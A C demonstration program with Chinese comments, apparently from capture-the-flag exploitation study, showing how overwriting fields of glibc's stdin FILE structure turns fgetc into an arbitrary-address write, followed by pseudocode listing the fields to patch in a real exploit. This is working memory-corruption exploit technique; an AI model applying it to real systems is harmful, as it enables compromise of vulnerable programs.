/*
 * 覆盖 stdin 字段获得任意地址写，适用于 glibc 2.23～2.43 / x86-64。
 *
 * 输入原语：可以覆盖 libc 中的 stdin 对象。
 * 成功效果：fgetc 最终执行 read(0, target, sizeof(target))。
 */

#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define IO_NO_READS 0x0004
#define IO_EOF_SEEN 0x0010

int main(void)
{
    static char input[] = "STDIN-CONTROLLED-BYTES";
    char target[sizeof(input)] = {0};
    int pipe_fd[2];

    /* 用 pipe 模拟选手从远端发送的输入。 */
    assert(pipe(pipe_fd) == 0);
    assert(write(pipe_fd[1], input, sizeof(input)) == sizeof(input));
    close(pipe_fd[1]);

    /* 把 pipe 的读端安装到标准输入 fd 0。 */
    assert(dup2(pipe_fd[0], STDIN_FILENO) == STDIN_FILENO);
    close(pipe_fd[0]);

    /* 清除“不可读”和“已经 EOF”，保证下一次读取可以进入 underflow。 */
    stdin->_flags &= ~(IO_NO_READS | IO_EOF_SEEN);

    /* read_ptr == read_end，使 fgetc 不能直接返回缓冲区旧数据。 */
    stdin->_IO_read_base = target;
    stdin->_IO_read_ptr = target;
    stdin->_IO_read_end = target;

    /* underflow 会把 [_IO_buf_base, _IO_buf_end) 当作 read 的目标缓冲区。 */
    stdin->_IO_buf_base = target;
    stdin->_IO_buf_end = target + sizeof(target);
    stdin->_fileno = STDIN_FILENO;

    /* fgetc 触发 _IO_new_file_underflow，底层 read 把数据写入 target。 */
    assert(fgetc(stdin) == input[0]);

    /* fgetc 返回首字节，但整段输入都已经进入 target。 */
    assert(memcmp(target, input, sizeof(input)) == 0);

    dprintf(STDOUT_FILENO, "[+] stdin 任意写成功\n");
    return 0;
}

/*
 * ======================== 字段补丁伪代码 ========================
 *
 * 已有 stdin 地址和可写目标区间时，只覆盖下面的必要字段：
 *
 *     stdin._flags &= ~(_IO_NO_READS | _IO_EOF_SEEN)； // 清除禁止读和文件结尾标记
 *     stdin._IO_read_base = target；
 *     stdin._IO_read_ptr = target；
 *     stdin._IO_read_end = target；
 *     stdin._IO_buf_base = target；
 *     stdin._IO_buf_end = target + length；
 *     stdin._fileno = 0；
 *
 * 保留合法 vtable，触发 fgetc/fread/underflow，使底层 read(0, target, length)
 * 把选手输入写到目标。`_fileno` 是 32 位字段，不要用一个 8 字节写同时破坏
 * 后面的 `_flags2`。
 */
